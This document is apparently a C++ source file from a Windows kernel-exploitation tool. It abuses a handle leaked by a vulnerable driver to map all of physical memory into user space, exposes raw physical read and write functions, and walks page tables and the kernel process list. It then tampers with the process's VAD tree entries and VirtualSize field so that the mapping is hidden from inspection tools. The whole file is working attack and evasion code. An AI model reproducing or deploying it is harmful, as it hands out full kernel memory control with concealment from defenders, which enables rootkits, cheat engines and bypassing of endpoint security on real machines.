#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include "syscalls.h"
#include "symbols.h"
#include "physmem.h"
#include "window.h"

#pragma comment(lib, "psapi.lib")

#define MAX_CHUNKS 256
#define CHUNK_SIZE 0x40000000ULL

// Which fields of a VadPatch were really read/patched, so RestorePhysWindow()
// never writes a stale zero back into a field the spoof never touched.
#define VP_FLAGS      0x01
#define VP_STARTVPN   0x02
#define VP_ENDVPN     0x04
#define VP_STARTHIGH  0x08
#define VP_ENDHIGH    0x10

struct VadPatch {
    ULONG64 flagsVA, startVpnVA, endVpnVA, startHighVA, endHighVA;
    ULONG origFlags, origStartVpn, origEndVpn;
    BYTE origStartHigh, origEndHigh;
    BYTE valid;
};

static BOOL WINAPI ConsoleCtrlHandler(DWORD ctrl);
#define MAX_VAD_PATCHES 256
static VadPatch g_VadPatches[MAX_VAD_PATCHES] = {};
static ULONG g_VadPatchCount = 0;

static ULONG64 g_SpoofCr3 = 0;
static ULONG64 g_VirtualSizeVA = 0;
static ULONG64 g_VirtualSizeOrig = 0;

struct PhysChunk {
    ULONG64 physBase;
    BYTE* mappedAddr;
    ULONG64 mapSize;
    // true once every page of the view is present, i.e. the window can be read
    // and written without ever taking another page fault. Only those chunks may
    // have their VAD truncated - see PrefaultWindow().
    bool resident;
};

static PhysChunk g_Chunks[MAX_CHUNKS] = {};
static ULONG g_ChunkCount = 0;
static ULONG64 g_TotalMapped = 0;

static inline BYTE* ResolvePhysAddr(ULONG64 physAddr) {
    if (physAddr < 0x1000) return NULL;
    ULONG chunkIdx = (ULONG)(physAddr / CHUNK_SIZE);
    if (chunkIdx >= g_ChunkCount || !g_Chunks[chunkIdx].mappedAddr)
        return NULL;
    ULONG64 offset = physAddr - g_Chunks[chunkIdx].physBase;
    return g_Chunks[chunkIdx].mappedAddr + offset;
}

// Read a byte of the window, trapping a fault. Kept in its own function so the
// __try block is not mixed with C++ objects that need unwinding (C2712).
static bool TouchWindowPage(BYTE* page) {
    __try {
        volatile BYTE* p = page;
        (void)*p;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
    return true;
}

// Write a byte back unchanged, trapping a fault. Used to verify - not to
// pre-fault - that the mapping is writable: see PrefaultWindow().
static bool ProbeWindowWrite(BYTE* page) {
    __try {
        BYTE v = *page;
        *page = v;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
    return true;
}

// Pre-fault the whole window before any VAD is spoofed.
//
// This is the hard requirement for the VAD spoof to be survivable. Truncating a
// VAD does not stop the kernel from keeping the section mapped, but it *does*
// remove the address range from the VAD tree, and a user-mode page fault is
// resolved through that tree: MiFindVad() finds nothing past the new end and
// the access comes back as STATUS_ACCESS_VIOLATION. The first physical read
// more than 64 KiB into a 1 GiB chunk after the spoof therefore kills the
// process - silently, because nothing in the tool has a handler there.
//
// Faulting every page in first makes the view need no further faults, so the
// truncated VADs only cost visibility (VirtualQuery) and nothing else.
//
// The touch is a read, never a write: these are live physical pages (kernel
// images, pools, DMA targets) and writing a byte back could clobber a
// concurrent update. Reads leave the contents untouched. A section-mapped
// physical page gets a present, section-writable PTE on a read fault, so the
// later WindowWrite* calls still work; ProbeWindowWrite() samples that.
static void PrefaultWindow() {
    ULONGLONG want = 0;
    for (ULONG i = 0; i < g_ChunkCount; i++)
        if (g_Chunks[i].mappedAddr) want += g_Chunks[i].mapSize;

    // Commit charge for the whole window is needed up front. If it cannot be
    // had, skip the spoof rather than take the guaranteed STATUS_ACCESS_VIOLATION.
    ULONGLONG available = 0;
    PERFORMANCE_INFORMATION perf = { sizeof(perf) };
    if (GetPerformanceInfo(&perf, sizeof(perf)) && perf.CommitLimit > perf.CommitTotal)
        available = (ULONGLONG)(perf.CommitLimit - perf.CommitTotal);

    const ULONGLONG slack = 512ULL << 20;
    if (available && want + slack > available) {
        printf("[-] Pre-faulting the window needs %llu MB of commit charge, only %llu MB free\n",
               want >> 20, available >> 20);
        printf("[-] VAD spoof disabled (leaving the VADs intact instead of faulting)\n");
        return;
    }

    ULONGLONG t0 = GetTickCount64();
    printf("[*] Pre-faulting window (%llu MB, this takes a moment)...\n", want >> 20);

    const ULONGLONG kProbeStride = 0x4000000ULL; // 64 MiB
    ULONG resident = 0;

    for (ULONG i = 0; i < g_ChunkCount; i++) {
        PhysChunk* c = &g_Chunks[i];
        if (!c->mappedAddr) continue;
        c->resident = false;

        bool ok = true;
        for (ULONGLONG off = 0; off < c->mapSize; off += 0x1000) {
            if (!TouchWindowPage(c->mappedAddr + off)) {
                printf("[-] Chunk %u could not be faulted in at +0x%llX, leaving it unspoofed\n",
                       i, off);
                ok = false;
                break;
            }
        }
        if (!ok) continue;

        // Confirm the mapping is writable while a page fault can still be taken.
        for (ULONGLONG off = 0; off < c->mapSize; off += kProbeStride) {
            if (!ProbeWindowWrite(c->mappedAddr + off)) {
                printf("[-] Chunk %u is not writable, leaving it unspoofed\n", i);
                ok = false;
                break;
            }
        }
        if (ok) {
            c->resident = true;
            resident++;
        }
    }

    printf("[+] Window pre-faulted: %u/%u chunks resident (%llu ms)\n",
           resident, g_ChunkCount, GetTickCount64() - t0);
}

bool SetupPhysWindow(HANDLE device, SyscallTable* sc, ULONG64 systemCr3, KernelOffsets* offsets) {
    printf("[*] Setting up physical memory window...\n");

    ULONGLONG installedKB = 0;
    GetPhysicallyInstalledSystemMemory(&installedKB);
    ULONG64 totalPhysBytes = installedKB * 1024;

    ULONG chunksNeeded = (ULONG)((totalPhysBytes + CHUNK_SIZE - 1) / CHUNK_SIZE);
    if (chunksNeeded > MAX_CHUNKS) chunksNeeded = MAX_CHUNKS;

    // trigger handle leak via initial IOCTL
    void* firstMap = PhysMap(device, sc, 0x1000, 0x1000);
    if (!firstMap) return false;

    // Read physical 0x1000 straight from the mapping the driver just gave us.
    // Do NOT call PhysRead64/PhysUnmap here: the driver keeps the mapping
    // handle in a single slot, so an interleaved map/unmap desyncs it and the
    // later IOCTL_UNMAP_PHYS closes a freed handle (INVALID_KERNEL_HANDLE).
    ULONG64 knownValue = *(volatile ULONG64*)firstMap;

    // find the leaked PhysicalMemory handle
    HANDLE physHandle = NULL;
    for (ULONG64 h = 4; h < 0x10000; h += 4) {
        void* test = MapViewOfFile((HANDLE)h, FILE_MAP_READ, 0, 0x1000, 0x1000);
        if (test) {
            ULONG64 testValue = *(volatile ULONG64*)test;
            UnmapViewOfFile(test);
            if (testValue == knownValue) {
                physHandle = (HANDLE)h;
                break;
            }
        }
    }

    if (!physHandle) return false;

    // map entire physical address space in 1GB chunks
    for (ULONG i = 0; i < chunksNeeded; i++) {
        ULONG64 physBase = (ULONG64)i * CHUNK_SIZE;
        ULONG64 mapStart = physBase;
        ULONG mapSize = (ULONG)CHUNK_SIZE;
        if (i == 0) { mapStart = 0x1000; mapSize -= 0x1000; }

        DWORD offHigh = (DWORD)(mapStart >> 32);
        DWORD offLow = (DWORD)(mapStart & 0xFFFFFFFF);

        void* mapped = MapViewOfFile(physHandle, FILE_MAP_READ | FILE_MAP_WRITE,
                                     offHigh, offLow, mapSize);
        if (!mapped) {
            g_Chunks[i].physBase = physBase;
            g_Chunks[i].mappedAddr = NULL;
            g_Chunks[i].mapSize = 0;
            g_Chunks[i].resident = false;
            continue;
        }

        g_Chunks[i].physBase = mapStart;
        g_Chunks[i].mappedAddr = (BYTE*)mapped;
        g_Chunks[i].mapSize = mapSize;
        g_Chunks[i].resident = false;
        g_ChunkCount = i + 1;
        g_TotalMapped += mapSize;
    }

    // Do NOT close physHandle: the vulnerable driver owns/closes this leaked
    // handle in its IOCTL_UNMAP_PHYS path. Closing it here makes the driver's
    // later ZwClose hit a freed handle (INVALID_KERNEL_HANDLE under verifier).
    // The mapped views keep working regardless.

    atexit([]() { RestorePhysWindow(); });
    SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE);

    printf("[+] Window: %llu MB in %u chunks\n", g_TotalMapped / (1024 * 1024), g_ChunkCount);

    // verify
    bool any = false;
    for (ULONG i = 0; i < g_ChunkCount; i++) {
        if (g_Chunks[i].mappedAddr && ResolvePhysAddr(g_Chunks[i].physBase + 0x1000)) {
            any = true;
            break;
        }
    }
    if (!any) return false;

    SetPhysWindowMode(true);
    printf("[+] Window verified\n");

    // Must happen before SpoofWindowVADs(), which depends on it.
    PrefaultWindow();

    return true;
}

ULONG64 WindowRead64(ULONG64 physAddr) {
    BYTE* p = ResolvePhysAddr(physAddr);
    return p ? *(volatile ULONG64*)p : 0;
}

ULONG WindowRead32(ULONG64 physAddr) {
    BYTE* p = ResolvePhysAddr(physAddr);
    return p ? *(volatile ULONG*)p : 0;
}

void WindowReadBuffer(ULONG64 physAddr, void* buffer, ULONG size) {
    BYTE* p = ResolvePhysAddr(physAddr);
    if (p) memcpy(buffer, p, size);
}

void WindowWrite64(ULONG64 physAddr, ULONG64 value) {
    BYTE* p = ResolvePhysAddr(physAddr);
    if (p) *(volatile ULONG64*)p = value;
}

void WindowWriteBuffer(ULONG64 physAddr, void* buffer, ULONG size) {
    BYTE* p = ResolvePhysAddr(physAddr);
    if (p) memcpy(p, buffer, size);
}

static BOOL WINAPI ConsoleCtrlHandler(DWORD ctrl) {
    if (ctrl == CTRL_CLOSE_EVENT || ctrl == CTRL_C_EVENT)
        RestorePhysWindow();
    return FALSE;
}

void RestorePhysWindow() {
    if (!g_VadPatchCount && !g_VirtualSizeVA) return;

    printf("[*] Restoring %u VAD patch(es)...\n", g_VadPatchCount);

    // Re-resolve physical addresses at restore time: the VAD page may have
    // been paged out and remapped since the spoof, so cached PAs can be stale.
    for (ULONG i = 0; i < g_VadPatchCount; i++) {
        VadPatch* p = &g_VadPatches[i];
        if (!p->valid) continue;
        ULONG64 pa;
        if (p->valid & VP_FLAGS) {
            pa = g_SpoofCr3 ? WindowVirtToPhys(g_SpoofCr3, p->flagsVA) : 0;
            if (pa) WindowWriteBuffer(pa, &p->origFlags, sizeof(p->origFlags));
        }
        if (p->valid & VP_STARTVPN) {
            pa = g_SpoofCr3 ? WindowVirtToPhys(g_SpoofCr3, p->startVpnVA) : 0;
            if (pa) WindowWriteBuffer(pa, &p->origStartVpn, sizeof(p->origStartVpn));
        }
        if (p->valid & VP_ENDVPN) {
            pa = g_SpoofCr3 ? WindowVirtToPhys(g_SpoofCr3, p->endVpnVA) : 0;
            if (pa) WindowWriteBuffer(pa, &p->origEndVpn, sizeof(p->origEndVpn));
        }
        if (p->valid & VP_STARTHIGH) {
            pa = g_SpoofCr3 ? WindowVirtToPhys(g_SpoofCr3, p->startHighVA) : 0;
            if (pa) WindowWriteBuffer(pa, &p->origStartHigh, 1);
        }
        if (p->valid & VP_ENDHIGH) {
            pa = g_SpoofCr3 ? WindowVirtToPhys(g_SpoofCr3, p->endHighVA) : 0;
            if (pa) WindowWriteBuffer(pa, &p->origEndHigh, 1);
        }
    }
    g_VadPatchCount = 0;

    if (g_VirtualSizeVA) {
        ULONG64 pa = g_SpoofCr3 ? WindowVirtToPhys(g_SpoofCr3, g_VirtualSizeVA) : 0;
        if (pa) WindowWrite64(pa, g_VirtualSizeOrig);
        g_VirtualSizeVA = 0;
    }

    printf("[+] VAD patches restored\n");
}

ULONG WindowVadPatchCount() {
    return g_VadPatchCount;
}

ULONG WindowResidentChunks() {
    ULONG n = 0;
    for (ULONG i = 0; i < g_ChunkCount; i++)
        if (g_Chunks[i].mappedAddr && g_Chunks[i].resident) n++;
    return n;
}

ULONG64 WindowVirtToPhys(ULONG64 cr3, ULONG64 virtualAddr) {
    const ULONG64 ADDR_MASK = 0x000FFFFFFFFFF000ULL;

    ULONG64 pml4e = WindowRead64((cr3 & ADDR_MASK) + ((virtualAddr >> 39) & 0x1FF) * 8);
    if (!(pml4e & 1)) return 0;

    ULONG64 pdpte = WindowRead64((pml4e & ADDR_MASK) + ((virtualAddr >> 30) & 0x1FF) * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80)
        return (pdpte & 0x000FFFFFC0000000ULL) + (virtualAddr & 0x3FFFFFFF);

    ULONG64 pde = WindowRead64((pdpte & ADDR_MASK) + ((virtualAddr >> 21) & 0x1FF) * 8);
    if (!(pde & 1)) return 0;
    if (pde & 0x80)
        return (pde & 0x000FFFFFFFE00000ULL) + (virtualAddr & 0x1FFFFF);

    ULONG64 pte = WindowRead64((pde & ADDR_MASK) + ((virtualAddr >> 12) & 0x1FF) * 8);
    if (!(pte & 1)) return 0;

    return (pte & ADDR_MASK) + (virtualAddr & 0xFFF);
}

// VAD spoofing internals

static ULONG64 SpoofReadPtr(HANDLE dev, SyscallTable* sc, ULONG64 cr3, ULONG64 va) {
    ULONG64 pa = VirtToPhys(dev, sc, cr3, va);
    return pa ? PhysRead64(dev, sc, pa) : 0;
}

static void WalkAndSpoofVAD(
    HANDLE dev, SyscallTable* sc,
    ULONG64 nodeVA, ULONG64 cr3, KernelOffsets* offsets,
    int depth, int* spoofed, ULONG64* visited
) {
    if (!nodeVA || depth > 40 || *spoofed >= (int)g_ChunkCount) return;
    if (++*visited > 100000) return; // a cyclic/hostile VAD tree must not hang us

    ULONG64 nodePA = VirtToPhys(dev, sc, cr3, nodeVA);
    if (!nodePA) return;

    ULONG64 left = PhysRead64(dev, sc, nodePA);
    ULONG64 right = PhysRead64(dev, sc, nodePA + 0x08);

    ULONG64 startVpnPA = VirtToPhys(dev, sc, cr3, nodeVA + offsets->VadStartingVpn);
    ULONG64 endVpnPA = VirtToPhys(dev, sc, cr3, nodeVA + offsets->VadEndingVpn);
    if (!startVpnPA || !endVpnPA) goto recurse;

    {
        ULONG startVpn = PhysRead32(dev, sc, startVpnPA);
        ULONG endVpn = PhysRead32(dev, sc, endVpnPA);
        ULONG64 regionStart = (ULONG64)startVpn << 12;
        ULONG64 regionSize = ((ULONG64)endVpn - startVpn + 1) << 12;

        for (ULONG i = 0; i < g_ChunkCount; i++) {
            if (!g_Chunks[i].mappedAddr) continue;
            // A chunk is only safe to hide when its pages are all present: after
            // the truncation the kernel can no longer resolve a fault for it.
            if (!g_Chunks[i].resident) continue;

            ULONG64 chunkVA = (ULONG64)g_Chunks[i].mappedAddr;
            ULONG64 chunkEnd = chunkVA + g_Chunks[i].mapSize - 1;
            if (regionSize <= 0x100000) continue;
            // the VAD must cover the *whole* view, not just its first page,
            // otherwise the other views sharing that VAD lose their faults
            if (chunkVA < regionStart || chunkEnd >= regionStart + regionSize) continue;
            if (g_VadPatchCount >= MAX_VAD_PATCHES) break;

            VadPatch* p = &g_VadPatches[g_VadPatchCount];
            p->flagsVA = nodeVA + offsets->VadFlags;
            p->startVpnVA = nodeVA + offsets->VadStartingVpn;
            p->endVpnVA = nodeVA + offsets->VadEndingVpn;
            p->startHighVA = nodeVA + offsets->VadStartingVpnHigh;
            p->endHighVA = nodeVA + offsets->VadEndingVpnHigh;
            p->valid = 0;

            ULONG64 flagsPA = VirtToPhys(dev, sc, cr3, p->flagsVA);
            ULONG64 startHighPA = VirtToPhys(dev, sc, cr3, p->startHighVA);
            ULONG64 endHighPA = VirtToPhys(dev, sc, cr3, p->endHighVA);

            // skip secured VADs - this node must be skipped, not just this chunk
            if (flagsPA) {
                ULONG secFlags = PhysRead32(dev, sc, flagsPA);
                if (secFlags & 4u) goto recurse;
            }

            p->origStartVpn = startVpn;
            p->valid |= VP_STARTVPN;
            p->origEndVpn = endVpn;
            p->valid |= VP_ENDVPN;
            if (startHighPA) {
                PhysReadBuffer(dev, sc, startHighPA, &p->origStartHigh, 1);
                p->valid |= VP_STARTHIGH;
            }
            if (endHighPA) {
                PhysReadBuffer(dev, sc, endHighPA, &p->origEndHigh, 1);
                p->valid |= VP_ENDHIGH;
            }

            if (flagsPA) {
                p->origFlags = PhysRead32(dev, sc, flagsPA);
                p->valid |= VP_FLAGS;
                ULONG flags = p->origFlags;
                flags |= (1u << 20);
                flags &= ~(1u << 25);
                PhysWriteBuffer(dev, sc, flagsPA, &flags, sizeof(flags));
            }

            ULONG fakeEnd = startVpn + 0x10;
            PhysWriteBuffer(dev, sc, endVpnPA, &fakeEnd, sizeof(fakeEnd));
            if (endHighPA) {
                BYTE z = 0;
                PhysWriteBuffer(dev, sc, endHighPA, &z, 1);
            }

            g_VadPatchCount++;
            (*spoofed)++;
            break;
        }
    }

recurse:
    WalkAndSpoofVAD(dev, sc, left, cr3, offsets, depth + 1, spoofed, visited);
    WalkAndSpoofVAD(dev, sc, right, cr3, offsets, depth + 1, spoofed, visited);
}

bool SpoofWindowVADs(HANDLE device, SyscallTable* sc, ULONG64 systemCr3, KernelOffsets* offsets) {
    printf("[*] Spoofing VADs...\n");

    g_SpoofCr3 = systemCr3;

    DWORD ourPid = GetCurrentProcessId();
    ULONG64 psActiveVA = offsets->NtoskrnlBase + offsets->PsActiveProcessHead;
    ULONG64 psActivePA = VirtToPhys(device, sc, systemCr3, psActiveVA);
    if (!psActivePA) return false;

    ULONG64 listHead = psActiveVA;
    ULONG64 currentLink = PhysRead64(device, sc, psActivePA);
    ULONG64 ourEprocessVA = 0;

    int count = 0;
    while (currentLink != listHead && currentLink != 0 && count < 500) {
        count++;
        ULONG64 eprocessVA = currentLink - offsets->ActiveProcessLinks;
        ULONG64 eprocessPA = VirtToPhys(device, sc, systemCr3, eprocessVA);
        if (!eprocessPA) break;

        if ((DWORD)PhysRead64(device, sc, eprocessPA + offsets->UniqueProcessId) == ourPid) {
            ourEprocessVA = eprocessVA;
            break;
        }

        ULONG64 nextPA = VirtToPhys(device, sc, systemCr3, currentLink);
        if (!nextPA) break;
        currentLink = PhysRead64(device, sc, nextPA);
    }

    if (!ourEprocessVA) return false;

    ULONG64 vadRootPA = VirtToPhys(device, sc, systemCr3, ourEprocessVA + offsets->VadRoot);
    if (!vadRootPA) return false;

    ULONG64 rootNode = PhysRead64(device, sc, vadRootPA);
    if (!rootNode) return false;

    int spoofed = 0;
    ULONG64 visited = 0;
    WalkAndSpoofVAD(device, sc, rootNode, systemCr3, offsets, 0, &spoofed, &visited);
    printf("[+] Spoofed %d VADs\n", spoofed);

    if (spoofed == 0 && WindowResidentChunks() == 0)
        printf("[-] No window chunk was pre-faulted, the VADs were left untouched\n");

    if (spoofed > 0 && offsets->VirtualSize) {
        g_VirtualSizeVA = ourEprocessVA + offsets->VirtualSize;
        ULONG64 vsPA = VirtToPhys(device, sc, systemCr3, g_VirtualSizeVA);
        if (vsPA) {
            g_VirtualSizeOrig = PhysRead64(device, sc, vsPA);
            PhysWrite64(device, sc, vsPA, 150ULL * 1024 * 1024);
        } else {
            g_VirtualSizeVA = 0;
        }
    }

    return spoofed > 0;
}
